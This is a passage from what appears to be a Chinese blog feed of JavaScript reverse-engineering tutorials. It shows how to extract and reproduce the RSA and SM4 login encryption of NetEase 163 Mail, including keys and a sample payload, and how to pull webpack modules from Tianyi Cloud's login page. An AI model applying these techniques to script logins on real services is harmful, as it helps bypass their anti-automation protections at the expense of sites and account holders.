<span class="title class_">Array</span>(n,r)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Z</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">modulus</span> = <span class="title function_">m</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">k</span> = <span class="title function_">I</span>(<span class="variable language_">this</span>.<span class="property">modulus</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">var</span> t, n, r = <span class="keyword">new</span> p;</span><br><span class="line">            r.<span class="property">digits</span>[<span class="number">2</span> * <span class="variable language_">this</span>.<span class="property">k</span>] = <span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">mu</span> = (t = r,</span><br><span class="line">            n = <span class="variable language_">this</span>.<span class="property">modulus</span>,</span><br><span class="line">            <span class="title function_">x</span>(t, n)[<span class="number">0</span>]),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bkplus1</span> = <span class="keyword">new</span> p,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bkplus1</span>.<span class="property">digits</span>[<span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>] = <span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">modulo</span> = J,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">multiplyMod</span> = X,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">powMod</span> = j</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">J</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title function_">U</span>(e, <span class="variable language_">this</span>.<span class="property">k</span> - <span class="number">1</span>)</span><br><span class="line">              , n = <span class="title function_">U</span>(<span class="title function_">R</span>(t, <span class="variable language_">this</span>.<span class="property">mu</span>), <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>)</span><br><span class="line">              , r = <span class="title function_">O</span>(<span class="title function_">B</span>(e, <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>), <span class="title function_">B</span>(<span class="title function_">R</span>(n, <span class="variable language_">this</span>.<span class="property">modulus</span>), <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>));</span><br><span class="line">            r.<span class="property">isNeg</span> &amp;&amp; (r = <span class="title function_">P</span>(r, <span class="variable language_">this</span>.<span class="property">bkplus1</span>));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="title function_">G</span>(r, <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>; o; )</span><br><span class="line">                o = <span class="title function_">G</span>(r = <span class="title function_">O</span>(r, <span class="variable language_">this</span>.<span class="property">modulus</span>), <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">X</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title function_">R</span>(e, t);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">modulo</span>(n)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">j</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            n.<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = e, o = t; <span class="number">0</span> != (<span class="number">1</span> &amp; o.<span class="property">digits</span>[<span class="number">0</span>]) &amp;&amp; (n = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(n, r)),</span><br><span class="line">            <span class="number">0</span> != (o = <span class="title function_">F</span>(o, <span class="number">1</span>)).<span class="property">digits</span>[<span class="number">0</span>] || <span class="number">0</span> != <span class="title function_">I</span>(o); )</span><br><span class="line">                r = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(r, r);</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> K = &#123;&#125;;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">W</span>(<span class="params">e, t, n, r</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">e</span> = <span class="title function_">C</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">d</span> = <span class="title function_">C</span>(t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">m</span> = <span class="title function_">C</span>(n),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">chunkSize</span> = <span class="string">&quot;number&quot;</span> != <span class="keyword">typeof</span> r ? <span class="number">2</span> * <span class="title function_">I</span>(<span class="variable language_">this</span>.<span class="property">m</span>) : r / <span class="number">8</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">radix</span> = <span class="number">16</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">barrett</span> = <span class="keyword">new</span> <span class="title function_">Z</span>(<span class="variable language_">this</span>.<span class="property">m</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        K.<span class="property">NoPadding</span> = <span class="string">&quot;NoPadding&quot;</span>,</span><br><span class="line">        K.<span class="property">PKCS1Padding</span> = <span class="string">&quot;PKCS1Padding&quot;</span>,</span><br><span class="line">        K.<span class="property">RawEncoding</span> = <span class="string">&quot;RawEncoding&quot;</span>,</span><br><span class="line">        K.<span class="property">NumericEncoding</span> = <span class="string">&quot;NumericEncoding&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> Q = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">var</span> V = &#123;</span><br><span class="line">            <span class="attr">encryptedString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Q || (<span class="title function_">f</span>(<span class="number">262</span>),</span><br><span class="line">                Q = <span class="keyword">new</span> <span class="title function_">W</span>(<span class="string">&quot;10001&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;BA58236D7F337C2B728A05F31028833AF83220330B129DC2407109776B644492BD7BBD8B15498C9C510B915FC4C559FE986F61867337785DB32C284C4E07FF256965DE53490CBBA28F14D413D407986ED3DF0E03032031EDD97054C3E6F4F8B322238EB5B0249556F99D9182B281F04B18CE9155332AF71C8A1A2E49087A571B&quot;</span>,<span class="number">1024</span>)),</span><br><span class="line">                <span class="variable language_">window</span>.<span class="title function_">btoa</span>(<span class="keyword">function</span>(<span class="params">e, t, n, r</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> o, i, a, u, l, c, s, d, f, m = <span class="keyword">new</span> <span class="title class_">Array</span>, g = t.<span class="property">length</span>, h = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (u = <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> n ? n == K.<span class="property">NoPadding</span> ? <span class="number">1</span> : n == K.<span class="property">PKCS1Padding</span> ? <span class="number">2</span> : <span class="number">0</span> : <span class="number">0</span>,</span><br><span class="line">                    l = <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r &amp;&amp; r == K.<span class="property">RawEncoding</span> ? <span class="number">1</span> : <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span> == u ? g &gt; e.<span class="property">chunkSize</span> &amp;&amp; (g = e.<span class="property">chunkSize</span>) : <span class="number">2</span> == u &amp;&amp; g &gt; e.<span class="property">chunkSize</span> - <span class="number">11</span> &amp;&amp; (g = e.<span class="property">chunkSize</span> - <span class="number">11</span>),</span><br><span class="line">                    o = <span class="number">0</span>,</span><br><span class="line">                    i = <span class="number">2</span> == u ? g - <span class="number">1</span> : e.<span class="property">chunkSize</span> - <span class="number">1</span>; o &lt; g; )</span><br><span class="line">                        u ? m[i] = t.<span class="title function_">charCodeAt</span>(o) : m[o] = t.<span class="title function_">charCodeAt</span>(o),</span><br><span class="line">                        o++,</span><br><span class="line">                        i--;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="number">1</span> == u &amp;&amp; (o = <span class="number">0</span>),</span><br><span class="line">                    i = e.<span class="property">chunkSize</span> - g % e.<span class="property">chunkSize</span>; i &gt; <span class="number">0</span>; ) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="number">2</span> == u) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">256</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()); !c; )</span><br><span class="line">                                c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">256</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>());</span><br><span class="line">                            m[o] = c</span><br><span class="line">                        &#125; <span class="keyword">else</span></span><br><span class="line">                            m[o] = <span class="number">0</span>;</span><br><span class="line">                        o++,</span><br><span class="line">                        i--</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="number">2</span> == u &amp;&amp; (m[g] = <span class="number">0</span>,</span><br><span class="line">                    m[e.<span class="property">chunkSize</span> - <span class="number">2</span>] = <span class="number">2</span>,</span><br><span class="line">                    m[e.<span class="property">chunkSize</span> - <span class="number">1</span>] = <span class="number">0</span>),</span><br><span class="line">                    s = m.<span class="property">length</span>,</span><br><span class="line">                    o = <span class="number">0</span>; o &lt; s; o += e.<span class="property">chunkSize</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (d = <span class="keyword">new</span> p,</span><br><span class="line">                        i = <span class="number">0</span>,</span><br><span class="line">                        a = o; a &lt; o + e.<span class="property">chunkSize</span>; ++i)</span><br><span class="line">                            d.<span class="property">digits</span>[i] = m[a++],</span><br><span class="line">                            d.<span class="property">digits</span>[i] += m[a++] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">                        f = e.<span class="property">barrett</span>.<span class="title function_">powMod</span>(d, e.<span class="property">e</span>),</span><br><span class="line">                        h += <span class="number">1</span> == l ? <span class="title function_">b</span>(f) : <span class="number">16</span> == e.<span class="property">radix</span> ? <span class="title function_">S</span>(f) : <span class="title function_">T</span>(f, e.<span class="property">radix</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> h</span><br><span class="line">                &#125;(Q, e, K.<span class="property">PKCS1Padding</span>, K.<span class="property">RawEncoding</span>))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        t.<span class="property">default</span> = V</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;87377&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encryptedString</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = e;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">return</span> t = p.<span class="property">default</span>.<span class="title function_">encryptedString</span>(e),</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>(),</span><br><span class="line">      t</span><br><span class="line">  &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">  &#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易163邮箱登录RSA加密</title>
      <link href="/2024/05/08/%E7%BD%91%E6%98%93163%E9%82%AE%E7%AE%B1%E7%99%BB%E5%BD%95RSA%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/05/08/%E7%BD%91%E6%98%93163%E9%82%AE%E7%AE%B1%E7%99%BB%E5%BD%95RSA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：网易163邮箱登录RSA加密018</li><li>链接：<a href="https://smart.mail.163.com/login.htm">https://smart.mail.163.com/login.htm</a></li><li>简介：定位<strong>密码字段</strong>的加密算法和<strong>encParams</strong>参数的加密过程</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081044026.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><h2 id="1-密码字段pw"><a href="#1-密码字段pw" class="headerlink" title="1. 密码字段pw"></a>1. 密码字段pw</h2><h3 id="（1）定位密码字段"><a href="#（1）定位密码字段" class="headerlink" title="（1）定位密码字段"></a>（1）定位密码字段</h3><p>查看network字段，发现有3个可能涉及的请求接口：”gt”、”l”、”powGetp”</p><p>里面请求体都为 encParams加密字段，所以判断不出哪个接口是真正的password加密</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081048395.png" alt="image.png"> </p><p>所以，这块需要将这三个接口都打XHR断点。每个接口都进行跟栈。</p><p>直接无脑xhr断点，一步步向上跟栈就完事了。。。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081048448.png" alt="image.png"> </p><h3 id="（2）第一个接口：”gt”"><a href="#（2）第一个接口：”gt”" class="headerlink" title="（2）第一个接口：”gt”"></a>（2）第一个接口：”gt”</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081057585.png" alt="image.png"> </p><p>向前跟栈，看能不能定位到和password相关的内容：这块具体过程就省略了……</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081057559.png" alt="image.png"> </p><p>继续向前一步跟栈，发现输入的用户名成功显示了，但没有任何密码相关的字段</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058772.png" alt="image.png"> </p><p>向前继续跟一下栈，确实没有发现任何密码字段相关内容。猜测该<strong>接口 “gt” 不是密码加密接口</strong>。</p><h3 id="（3）第二个接口：”l”"><a href="#（3）第二个接口：”l”" class="headerlink" title="（3）第二个接口：”l”"></a>（3）第二个接口：”l”</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058487.png" alt="image.png"> </p><p>向前跟栈……</p><p>找到了这样一个栈中提到了”un”和”pw”字段，不出意外，对应下来，应该是用户名和加密后的密码</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058410.png" alt="image.png"> </p><p>再向前跟栈，最终定位pw字段最后一次出现的位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081059207.png" alt="image.png"> </p><p>再往前跟栈，发现找不到pw字段了。所以，这块在当前JS中搜索关键字 “pw”</p><p>找到多处，仔细观察发现涉及到pw的代码都有出现函数<strong>MP.encrypt2</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e.pw = MP.encrypt2(this.__password);</span><br><span class="line">t.pw = MP.encrypt2(this.$refs.mpinput._$getValue() || &quot;0&quot;);</span><br><span class="line">t.pw = MP.encrypt2(i);</span><br><span class="line">e.pw = MP.encrypt2(this.__password);</span><br></pre></td></tr></table></figure><p>下断点，最终在 “t.pw &#x3D; MP.encrypt2(i);” 位置断下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081107555.png" alt="image.png"> </p><p>也就说明 <strong>MP.encrypt2</strong> 是真正的加密函数。</p><h3 id="（4）第三个接口”powGetp”"><a href="#（4）第三个接口”powGetp”" class="headerlink" title="（4）第三个接口”powGetp”"></a>（4）第三个接口”powGetp”</h3><p>这个就不说了，和上面分析思路类似。看了下跟密码字段也没啥关系</p><h3 id="（5）MP-encrypt2加密函数分析"><a href="#（5）MP-encrypt2加密函数分析" class="headerlink" title="（5）MP.encrypt2加密函数分析"></a>（5）MP.encrypt2加密函数分析</h3><p>确认为RSA加密。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081109251.png" alt="image.png"> </p><p>硬扣代码：搞定！</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="comment">//前面代码省略，就直接将这个JS拿下来就行</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt2</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> h = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5gsH+AA4XWONB5TDcUd+xCz7ejOFHZKlcZDx+pF1i7Gsvi1vjyJoQhRtRSn950x498VUkx7rUxg1/ScBVfrRxQOZ8xFBye3pjAzfb22+RCuYApSVpJ3OO3KsEuKExftz9oFBv3ejxPlYc5yq7YiBO8XlTnQN0Sa4R4qhPO3I2MQIDAQAB-----END PUBLIC KEY-----&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> t = <span class="variable constant_">RSA</span>.<span class="title function_">getPublicKey</span>(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">RSA</span>.<span class="title function_">encrypt</span>(e, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081109195.png" alt="image.png"> </p><h2 id="2-encParams加密参数"><a href="#2-encParams加密参数" class="headerlink" title="2. encParams加密参数"></a>2. encParams加密参数</h2><p>全局搜索，定位到参数位置：确认SM4加密</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081110950.png" alt="image.png"> </p><h3 id="（1）跟进加密函数r-sm4Encrypt"><a href="#（1）跟进加密函数r-sm4Encrypt" class="headerlink" title="（1）跟进加密函数r._$sm4Encrypt"></a>（1）跟进加密函数r._$sm4Encrypt</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_p._$sm4Encrypt = function(e) &#123;</span><br><span class="line">        return window.URSSM4.encrypt(JSON.stringify(e), _sm4pubkey)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111173.png" alt="image.png"> </p><p>这块的 _sm4pubkey 是固定值为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_sm4pubkey = &#x27;BC60B8B9E4FFEFFA219E5AD77F11F9E2&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111473.png" alt="image.png"> </p><p>定位 “window.URSSM4.encrypt” 函数位置，发现是webpack的形式</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111841.png" alt="image.png"> </p><h3 id="（2）webpack代码分析"><a href="#（2）webpack代码分析" class="headerlink" title="（2）webpack代码分析"></a>（2）webpack代码分析</h3><p>①代码先复制进notepad++中</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111138.png" alt="image.png"> </p><p>②找到分发器的位置</p><p>发现这块有调用的过程，且调用函数为n，所以猜测函数n所在位置可能为分发器</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112926.png" alt="image.png"> </p><p>下断点，重新刷新一下页面（因为webpack是在页面最初就加载进来的，所以需要刷新页面）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112841.png" alt="image.png"> </p><p>成功断下，定位到n的位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112802.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112996.png" alt="image.png"> </p><p>分发器代码简单改写下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _e</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = n[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== r)</span><br><span class="line">      <span class="keyword">return</span> r.<span class="property">exports</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,i)</span><br><span class="line">     r = n[i] = &#123;</span><br><span class="line">       <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">       &#125;;</span><br><span class="line">    <span class="keyword">return</span> t[i](r, r.<span class="property">exports</span>, e),</span><br><span class="line">    r.<span class="property">exports</span></span><br><span class="line">  &#125;</span><br><span class="line">  _e = e</span><br><span class="line">&#125;(&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//加载webpack模块</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>③扣取加密模块代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">太多了，省略……</span><br></pre></td></tr></table></figure><p>④编写加密函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pwd = <span class="string">&#x27;&#123;&quot;un&quot;:&quot;admin123@163.com&quot;,&quot;pw&quot;:&quot;ffhnKr8vA0EIEEclcRR6Ik8sDkEkjcvalofxRMQcS+ADdxyWoPpZFE6pehucjf/+0F5MliRjC51VMPUkGK/ceLj5fTlhNj34pHSfnU7zMd35XwSaPax/ucpNWpStm4tb0gyl+rb0ulEzQn7Tk4FR1hCUcE5kyAjo52567M+Eb8Q=&quot;,&quot;pd&quot;:&quot;mail163&quot;,&quot;l&quot;:0,&quot;d&quot;:30,&quot;t&quot;:1695908789441,&quot;pkid&quot;:&quot;CvViHzl&quot;,&quot;domains&quot;:&quot;163.com&quot;,&quot;tk&quot;:&quot;8753c188d3bbad4996c4cf699e3beef5&quot;,&quot;pwdKeyUp&quot;:1,&quot;channel&quot;:0,&quot;topURL&quot;:&quot;https://smart.mail.163.com/login.htm&quot;,&quot;rtid&quot;:&quot;RXuDHOFWWNPiiotxQy3UqrnZvRh7yrSM&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _sm4pubkey = <span class="string">&#x27;BC60B8B9E4FFEFFA219E5AD77F11F9E2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_e</span>(<span class="string">&#x27;9579&#x27;</span>); <span class="comment">//定义导出函数，将加密模块导出为全局变量p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">pwd</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> p.<span class="title function_">encrypt</span>(pwd, _sm4pubkey)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）完整代码测试"><a href="#（3）完整代码测试" class="headerlink" title="（3）完整代码测试"></a>（3）完整代码测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略略略……</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081115683.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081115482.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> webpack </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>T翼云扣webpack原生代码</title>
      <link href="/2024/05/07/T%E7%BF%BC%E4%BA%91%E6%89%A3webpack%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/05/07/T%E7%BF%BC%E4%BA%91%E6%89%A3webpack%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="逆向目标"><a href="#逆向目标" class="headerlink" title="逆向目标"></a>逆向目标</h1><ul><li>目标：天翼云登录框</li><li>链接：<a href="https://m.ctyun.cn/wap/main/auth/login">https://m.ctyun.cn/wap/main/auth/login</a></li><li>简介：主要对加密的函数的提取，找打加密的地方，分析加密函数，提取重要的JS代码进行加密算法还原</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071539849.png" alt="image.png"> </p><ul><li>发现这块的JS是webpack打包过的</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071539902.png" alt="image.png"> </p><p>webpack的特点：将所有的函数封装好，集成到一个个模块中，然后使用加载器或方法体来调用这些模块，变成一个对象，这样子就可以使用这个模块里面的函数和属性。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071541946.png" alt="image-20240507154149907"> </p><h1 id="webpack讲解"><a href="#webpack讲解" class="headerlink" title="webpack讲解"></a>webpack讲解</h1><p><a href="https://blog.csdn.net/sin_0119/article/details/129658679">js逆向——webpack扣法_webpack 逆向-CSDN博客</a></p><h2 id="01-webpack简介"><a href="#01-webpack简介" class="headerlink" title="01 webpack简介"></a>01 webpack简介</h2><p>webpack是个静态模块打包工具，目的是为了让前端工程师写的前端代码变成浏览器可以识别的代码，并且可以达到前端项目的模块化，也就是如何更高效地管理和维护项目中的每一个资源。</p><p>但无疑是对js逆向造成了妨碍。但如果掌握了扣取webpack的一些技巧也是不难的。接下来，说一下对扣取webpack代码的一些理解。</p><h2 id="02-webpack的组成"><a href="#02-webpack的组成" class="headerlink" title="02 webpack的组成"></a>02 webpack的组成</h2><p>一个最基本的webpack组成有两个部分:</p><ul><li>自执行函数</li><li>模块加载器(实际上也就是一个函数而已)</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071543472.png" alt="img"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.传入的参数是一个数组</span></span><br><span class="line"><span class="keyword">var</span> _xxx;</span><br><span class="line">！<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">xxx</span>(<span class="params">y</span>)&#123;    #这个是模块加载器，这个y传入的可以是索引和对象的key，参数表示的是列表或对象的形参</span><br><span class="line">        x[y].<span class="title function_">call</span>(参数) </span><br><span class="line">    &#125;</span><br><span class="line">    _xxx = xxx;</span><br><span class="line">&#125;( [<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个&quot;</span>)&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">consolelog</span>(<span class="string">&quot;第二个&quot;</span>)&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第三个&quot;</span>)&#125;</span><br><span class="line">   ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">//比如</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="number">0</span>); <span class="comment">//执行得到的就是输出——第一个</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="number">1</span>);<span class="comment">//执行得到的就是输出——第二个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.传入的参数是一个对象</span></span><br><span class="line"><span class="keyword">var</span> _xxx;</span><br><span class="line">！<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">xxx</span>(<span class="params">y</span>)&#123;    #这个是模块加载器，这个y传入的可以是索引和对象的key，参数表示的是列表或对象的形参</span><br><span class="line">        x[y].<span class="title function_">call</span>(参数) </span><br><span class="line">    &#125;</span><br><span class="line">    _xxx = xxx;</span><br><span class="line">&#125;( &#123;</span><br><span class="line">    <span class="attr">obj1</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个&quot;</span>)&#125;,</span><br><span class="line">    <span class="attr">obj2</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">consolelog</span>(<span class="string">&quot;第二个&quot;</span>)&#125;,</span><br><span class="line">    <span class="attr">obj3</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第三个&quot;</span>)&#125;</span><br><span class="line">   &#125; );</span><br><span class="line"><span class="comment">//因为传入的是一个对象，那想要调用对象就要指明key</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="string">&quot;obj1&quot;</span>)</span><br><span class="line"><span class="title function_">_xxx</span>(<span class="string">&quot;obj2&quot;</span>)<span class="comment">//和数组相比只是调用方式不同而已，原理基本一致</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="03-实战看webpack组成"><a href="#03-实战看webpack组成" class="headerlink" title="03 实战看webpack组成"></a>03 实战看webpack组成</h2><p>光说不练假把式，接下来我们从真实的网站中看一看关于webpack组成:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071602810.png" alt="img"> </p><p>通过观察真实网站的webpack可以发现,这种情况与我们自己写的那个大差不差，无非就是加载器函数中功能更完善了些。</p><p>这种加载器函数与执行对象在一个文件中的webpack很好扣js,至于如何扣我们以后再说，今天要解决的是下面的这种要怎么扣取代码呢?</p><p><img 